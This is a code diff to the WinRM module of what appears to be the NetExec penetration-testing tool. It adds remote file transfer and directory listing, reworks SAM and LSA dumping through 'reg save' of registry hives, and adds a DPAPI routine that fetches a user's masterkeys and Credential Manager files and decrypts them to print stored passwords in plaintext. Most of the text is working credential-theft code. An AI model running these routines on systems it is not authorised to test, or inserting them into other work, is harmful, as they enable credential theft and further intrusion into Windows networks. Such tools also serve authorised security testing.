@@ -1,8 +1,10 @@
 import os
 import base64
+import traceback
 import requests
 import urllib3
 import logging
+import ntpath
 import xml.etree.ElementTree as ET
 
 from pypsrp.wsman import NAMESPACES
@@ -10,14 +12,19 @@ from pypsrp.client import Client
 from pypsrp.powershell import PSDataStreams
 from termcolor import colored
 
+from dploot.lib.utils import is_guid, is_credfile
+from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
+from impacket.uuid import bin_to_string
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.logger import highlight
 from nxc.helpers.misc import gen_random_string
-from nxc.helpers.ntlm_parser import parse_challenge
+from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
+from nxc.paths import TMP_PATH
 
 urllib3.disable_warnings()
 
@@ -65,12 +72,20 @@ class winrm(connection):
         self.server_os = ntlm_info["os_version"]
         self.logger.extra["hostname"] = self.hostname
 
-        self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
+        try:
+            self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
+        except Exception as e:
+            self.logger.debug(f"Error adding host to database: {e!s}")
 
         if self.args.domain:
             self.domain = self.args.domain
         if self.args.local_auth:
             self.domain = self.hostname
+
+        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
+            result = self.resolver(self.domain)
+            self.kdcHost = result["host"] if result else None
+            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
 
     def print_host_info(self):
         self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
@@ -287,6 +302,40 @@ class winrm(connection):
         if get_output:
             return result
 
+    def get_file(self, remote_path=None, download_path=None):
+        remote_path = remote_path if remote_path else self.args.get_file[0]
+        local_path = download_path if download_path else self.args.get_file[1]
+
+        # Do a bit of smart handling for the local file path
+        if local_path.endswith("/"):
+            local_path += ntpath.basename(remote_path)
+        try:
+            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
+            self.conn.fetch(remote_path, local_path)
+            self.logger.success(f"File {remote_path} has been saved to {local_path}")
+        except Exception as e:
+            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
+
+    def put_file(self, local_path=None, remote_path=None):
+        local_path = local_path if local_path else self.args.put_file[0]
+        remote_path = remote_path if remote_path else self.args.put_file[1]
+
+        # Do a bit of smart handling for the remote file path
+        remote_path += os.path.basename(local_path) if remote_path.endswith(("\\", "/")) else ""
+        try:
+            self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')
+            self.conn.copy(local_path, remote_path)
+            self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
+        except Exception as e:
+            self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")
+
+    def dir(self, directory=None):
+        directory = directory if directory else self.args.dir
+        out = self.execute(f"dir {directory}", True)
+        if out is not None:
+            for line in out.splitlines():
+                self.logger.highlight(line.rstrip())
+
     # Dos attack prevent:
     # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
     # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
@@ -298,10 +347,11 @@ class winrm(connection):
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="sam")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", self.output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", self.output_filename + ".system")
+            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -311,26 +361,28 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
             SAM = SAMHashes(
-                f"{self.output_filename}.sam",
+                f"{output_filename}.sam",
                 boot_key,
                 isRemote=None,
                 perSecretCallback=lambda secret: self.logger.highlight(secret),
             )
             SAM.dump()
-            SAM.export(f"{self.output_filename}.sam")
+            SAM.export(output_filename)
 
     def lsa(self):
         security_storename = gen_random_string(6)
         system_storename = gen_random_string(6)
         dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
         clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        output_filename = self.output_file_template.format(output_folder="lsa")
         try:
             self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{self.output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{self.output_filename}.system")
+            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
             self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
         except Exception as e:
             if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
@@ -340,10 +392,11 @@ class winrm(connection):
             else:
                 self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
         else:
-            local_operations = LocalOperations(f"{self.output_filename}.system")
+            self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
             LSA = LSASecrets(
-                f"{self.output_filename}.security",
+                f"{output_filename}.security",
                 boot_key,
                 None,
                 isRemote=None,
@@ -351,3 +404,147 @@ class winrm(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    def dpapi(self):
+        """
+        Find and unlock Credential Manager masterkeys and credentials owned by user.
+        The flow is inspired by and a simplified version of dploot's triage methods for user masterkeys and credentials.
+        Actual decryption of keys and credentials is taken and adapted from impacket-dpapi.
+        """
+        user_masterkey_path = ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Protect")
+        user_credentials_paths = [
+            ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Credentials"),
+            ntpath.join("C:\\Users", self.username, "AppData\\Local\\Microsoft\\Credentials")
+        ]
+
+        self.logger.display("Collecting DPAPI masterkeys...")
+
+        sids = self.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
+        if not sids:
+            self.logger.fail(f"No masterkeys found for user {self.username}")
+            return
+
+        masterkeys = []
+        for sid in sids.splitlines():
+            keys_path = ntpath.join(user_masterkey_path, sid.strip())
+            keys = self.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)
+            for key in keys.splitlines():
+                stripped_key = key.strip()
+                if is_guid(stripped_key):
+                    key_path = ntpath.join(keys_path, stripped_key)
+                    self.logger.debug(f"Found masterkey file {key_path}")
+                    local_key_file = f"{TMP_PATH}/{stripped_key}"
+                    self.conn.fetch(key_path, local_key_file)
+                    decrypted_key = self.get_master_key(local_key_file, sid, self.password)
+                    if decrypted_key:
+                        masterkeys.append((stripped_key, decrypted_key))
+
+        if not masterkeys:
+            self.logger.fail("Could not decrypt any keys")
+            return
+
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
+
+        credential_files = []
+        for user_credentials_path in user_credentials_paths:
+            creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
+            for cred_file in creds.splitlines():
+                stripped_cred_file = cred_file.strip()
+                if is_credfile(stripped_cred_file):
+                    creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
+                    self.logger.debug(f"Found credentials file {creds_path}")
+                    local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"
+                    self.conn.fetch(creds_path, local_cred_file)
+                    credential_files.append(local_cred_file)
+
+        if not credential_files:
+            self.log.fail(f"No credential files found for user {self.username}")
+            return
+
+        for creds_file in credential_files:
+            with open(creds_file, "rb") as fp:
+                data = fp.read()
+            cred = CredentialFile(data)
+            blob = DPAPI_BLOB(cred["Data"])
+
+            guid_masterkey = bin_to_string(blob["GuidMasterKey"])
+            right_key = next((key for guid, key in masterkeys if guid.lower() == guid_masterkey.lower()), None)
+
+            if right_key is not None:
+                try:
+                    decrypted = blob.decrypt(right_key)
+                    if decrypted is not None:
+                        self.logger.debug(f"Successfully decrypted credentials in {creds_file}:")
+                        creds = CREDENTIAL_BLOB(decrypted)
+                        if creds["Unknown3"] != b"":
+                            target = creds["Target"].decode("utf-16le")
+                            username = creds["Username"].decode("utf-16le")
+                            try:
+                                password = creds["Unknown3"].decode("utf-16le")
+                            except UnicodeDecodeError:
+                                password = creds["Unknown3"].decode("latin-1")
+                            self.logger.highlight(f"{target} - {username}:{password}")
+                except Exception as e:
+                    self.logger.fail(f"Failed to decrypt credentials in {creds_file} with masterkey: {e!s}")
+                    self.logger.debug(traceback.format_exc())
+            else:
+                self.logger.fail(f"No matching masterkey found for credentials in {creds_file} (need {guid_masterkey})")
+
+    def get_master_key(self, masterkey_file, sid, password):
+        """
+        Taken and adapted from impacket.examples.dpapi
+        Could be cleaned up but the more we deviate from the original the harder it will be to maintain it
+        """
+        with open(masterkey_file, "rb") as fp:
+            data = fp.read()
+        mkf = MasterKeyFile(data)
+        data = data[len(mkf):]
+
+        if mkf["MasterKeyLen"] > 0:
+            mk = MasterKey(data[:mkf["MasterKeyLen"]])
+            data = data[len(mk):]
+
+        if mkf["BackupKeyLen"] > 0:
+            bkmk = MasterKey(data[:mkf["BackupKeyLen"]])
+            data = data[len(bkmk):]
+
+        if mkf["CredHistLen"] > 0:
+            ch = CredHist(data[:mkf["CredHistLen"]])
+            data = data[len(ch):]
+
+        if mkf["DomainKeyLen"] > 0:
+            dk = DomainKey(data[:mkf["DomainKeyLen"]])
+            data = data[len(dk):]
+
+        key1, key2, key3 = deriveKeysFromUser(sid, password)
+
+        # if mkf['flags'] & 4 ? SHA1 : MD4
+        decryptedKey = mk.decrypt(key3)
+        if decryptedKey:
+            self.logger.debug("Decrypted key with User Key (MD4 protected)")
+            return decryptedKey
+
+        decryptedKey = mk.decrypt(key2)
+        if decryptedKey:
+            self.logger.debug("Decrypted key with User Key (MD4)")
+            return decryptedKey
+
+        decryptedKey = mk.decrypt(key1)
+        if decryptedKey:
+            self.logger.debug("Decrypted key with User Key (SHA1)")
+            return decryptedKey
+
+        decryptedKey = bkmk.decrypt(key3)
+        if decryptedKey:
+            self.logger.debug("Decrypted Backup key with User Key (MD4 protected)")
+            return decryptedKey
+
+        decryptedKey = bkmk.decrypt(key2)
+        if decryptedKey:
+            self.logger.debug("Decrypted Backup key with User Key (MD4)")
+            return decryptedKey
+
+        decryptedKey = bkmk.decrypt(key1)
+        if decryptedKey:
+            self.logger.debug("Decrypted Backup key with User Key (SHA1)")
+            return decryptedKey
